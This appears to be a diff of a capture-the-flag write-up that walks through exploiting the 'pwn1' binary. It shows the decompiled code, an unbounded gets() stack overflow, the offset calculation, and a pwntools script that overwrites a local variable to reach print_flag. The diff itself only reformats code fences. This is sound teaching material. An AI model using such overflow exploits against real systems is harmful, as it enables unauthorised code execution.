@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```bash
 $    file pwn1
 pwn1: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd7aa1accb16feac888c99841f504, not stripped
 $    pwn checksec pwn1
@@ -21,7 +21,7 @@ I don't know that! Auuuuuuuugh!
 
 So we can see that it is a `32` bit binary with RELRO, a Non-Executable Stack, and PIE (those binary mitigations will be discussed later). We can see that when we run the binary, it prompts us for input, and prints some text. When we take a look at the main function in Ghidra we see this:
 
-```
+```c
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
 /* WARNING: Removing unreachable block (ram,0x000108bb) */
 
@@ -31,7 +31,7 @@ undefined4 main(void)
   int strcmpResult0;
   int strcmpResult1;
   char input [43];
- 
+
   setvbuf(stdout,(char *)0x2,0,0);
   puts(
       "Stop! Who would cross the Bridge of Death must answer me these questions three, ere theother side he see."
@@ -62,7 +62,8 @@ undefined4 main(void)
 So right off the back, we can see we are dealing with a reference to one of the greatest movies ever (Monty Python and the Holy Grail). We can see that it will scan in input into `input` using `fgets`, then compares our input with `strcmp`. It does this twice. The first time it checks for the string `Sir Lancelot of Camelot\n` and the second time it checks for the string `To seek the Holy Grail.\n`. If we don't pass the check the first time, it will print `I don\'t know that! Auuuuuuuugh!` and exit. For the second check if we pass it, the code will call the function `gets` with `input` as an argument. The function `gets` will scan in data until it either gets a newline character or an EOF. As a result on paper there is no limit to how much it can scan into memory. Since the are it is scanning into is finite, we will be able to overflow it and start overwriting subsequent things in memory.
 
 Also looking at the assembly code for around the `gets` call, we see something interesting that the decompiled code doesn't show us:
-```
+
+```asm
         000108aa e8 71 fc        CALL       gets                                             char * gets(char * __s)
                  ff ff
         000108af 83 c4 10        ADD        ESP,0x10
@@ -74,7 +75,8 @@ Also looking at the assembly code for around the `gets` call, we see something i
 ```
 
 So we can see that it compares the contents of `local_18` to `0xdea110c8`, and if it is equal (which would mean it's zero) it calls the `print_flag` function. Looking at the decompiled code for `print_flag`, we see that it prints the contents of `flag.txt`:
-```
+
+```c
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
 
 void print_flag(void)
@@ -82,7 +84,7 @@ void print_flag(void)
 {
   FILE *flagFile;
   int flag;
- 
+
   puts("Right. Off you go.");
   flagFile = fopen("flag.txt","r");
   while( true ) {
@@ -97,36 +99,36 @@ void print_flag(void)
 
 So if we can use the `gets` call to overwrite the contents of `local_18` to `0xdea110c8`, we should get the flag (if you're running this locally you will need to have a copy of `flag.txt` that is in the same directory as the binary). So in order to reach the `gets` call, we will need to send the program the string `Sir Lancelot of Camelot\n` and `To seek the Holy Grail.\n`. Looking at the stack layout in Ghidra (we can see it by double clicking on any of the variables in the variable declarations for the main function) shows us the offset between the start of our input and `local_18`:
 
-```
+```asm
                              **************************************************************
                              *                          FUNCTION                          *
                              **************************************************************
                              undefined main(undefined1 param_1)
              undefined         AL:1           <RETURN>                                XREF[2]:     00010807(W),
-                                                                                                   00010869(W)  
-             undefined1        Stack[0x4]:1   param_1                                 XREF[1]:     00010779(*)  
-             int               EAX:4          strcmpResult0                           XREF[1]:     00010807(W)  
-             int               EAX:4          strcmpResult1                           XREF[1]:     00010869(W)  
-             undefined4        Stack[0x0]:4   local_res0                              XREF[1]:     00010780(R)  
-             undefined1        Stack[-0x10]:1 local_10                                XREF[1]:     000108d9(*)  
-             undefined4        Stack[-0x14]:4 local_14                                XREF[1]:     000107ad(W)  
+                                                                                                   00010869(W)
+             undefined1        Stack[0x4]:1   param_1                                 XREF[1]:     00010779(*)
+             int               EAX:4          strcmpResult0                           XREF[1]:     00010807(W)
+             int               EAX:4          strcmpResult1                           XREF[1]:     00010869(W)
+             undefined4        Stack[0x0]:4   local_res0                              XREF[1]:     00010780(R)
+             undefined1        Stack[-0x10]:1 local_10                                XREF[1]:     000108d9(*)
+             undefined4        Stack[-0x14]:4 local_14                                XREF[1]:     000107ad(W)
              undefined4        Stack[-0x18]:4 local_18                                XREF[2]:     000107b4(W),
-                                                                                                   000108b2(R)  
+                                                                                                   000108b2(R)
              char[43]          Stack[-0x43]   input                                   XREF[5]:     000107ed(*),
                                                                                                    00010803(*),
                                                                                                    0001084f(*),
                                                                                                    00010865(*),
-                                                                                                   000108a6(*)  
+                                                                                                   000108a6(*)
                              main                                            XREF[5]:     Entry Point(*),
                                                                                           _start:000105e6(*), 00010ab8,
-                                                                                          00010b4c(*), 00011ff8(*)  
+                                                                                          00010b4c(*), 00011ff8(*)
         00010779 8d 4c 24 04     LEA        ECX=>param_1,[ESP + 0x4]
 
 ```
 
 So we can see that `input` starts at offset `-0x43`. We see that `local_18` starts at offset `-0x18`. This gives us an offset of `0x43 - 0x18 = 0x2b` between the start of our input and `local_18`. Then we can just overflow it (write more data to a region than it can hold, so it spills over and starts overwriting subsequent things in memory) and overwrite `local_18` with `0xdea110c8`. Putting it all together we get the following exploit:
 
-```
+```python
 # Import pwntools
 from pwn import *
 
@@ -149,7 +151,8 @@ target.interactive()
 ```
 
 When we run it:
-```
+
+```bash
 $    python exploit.py
 [+] Starting local process './pwn1': pid 12060
 [*] Switching to interactive mode
